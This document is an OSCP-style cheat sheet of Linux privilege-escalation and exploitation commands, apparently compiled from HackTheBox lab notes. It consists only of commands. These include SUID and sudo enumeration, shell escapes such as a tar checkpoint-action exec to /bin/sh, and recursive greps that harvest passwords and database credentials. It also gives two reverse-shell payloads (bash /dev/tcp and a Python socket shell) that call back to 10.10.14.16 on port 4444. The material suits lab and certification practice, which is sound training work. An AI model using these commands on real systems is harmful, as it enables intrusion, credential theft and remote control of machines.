# OSCP - Linux Priv & Exploits (Commands only)

## Enumeration
uname -a
id
cat /etc/os-release
ip a
ss -tulpn
ps aux --sort=-%mem | head
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

## Sudo checks
sudo -l
getcap -r / 2>/dev/null
ls -la /etc/cron* /etc/systemd/system
crontab -l 2>/dev/null
systemctl list-timers --all 2>/dev/null

## SUID / PATH hijack
find / -type f -perm -4000 2>/dev/null
env -i PATH=/tmp:$PATH vulnerable_binary

## Exploit patterns
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
/bin/bash -p
perl -e 'exec "/bin/sh";'
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

## Files & creds
grep -R "password" /etc /var/www /home 2>/dev/null
grep -R "DB_PASSWORD" -n / 2>/dev/null
cat /var/www/html/config.php

## Reverse shells payloads
bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.16",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

## Transfer / serve
python3 -m http.server 80
$NC -nv TARGET 80 < file
scp user@TARGET:/path/to/file .

## Backup / config abuse
cat /etc/cron.d/* 2>/dev/null
cat /etc/cron.daily/* 2>/dev/null
cat /opt/update_dependencies.rb
cat mynpbackup.conf

## Useful utils
strings /path/to/binary | grep -i password
xxd -p file | tr -d '\n'
base64 -d file

## Sources
[Linux/OpenAdmin/notes.txt](Linux/OpenAdmin/notes.txt)
[Linux/Builder/notes.txt](Linux/Builder/notes.txt)
[Linux/Precious/notes.txt](Linux/Precious/notes.txt)
[Linux/TartarSauce/notes.txt](Linux/TartarSauce/notes.txt)
[Linux/LinkVortex/notes.txt](Linux/LinkVortex/notes.txt)
[Linux/Keeper/notes.txt](Linux/Keeper/notes.txt)
[Linux/Monitored/notes.txt](Linux/Monitored/notes.txt)
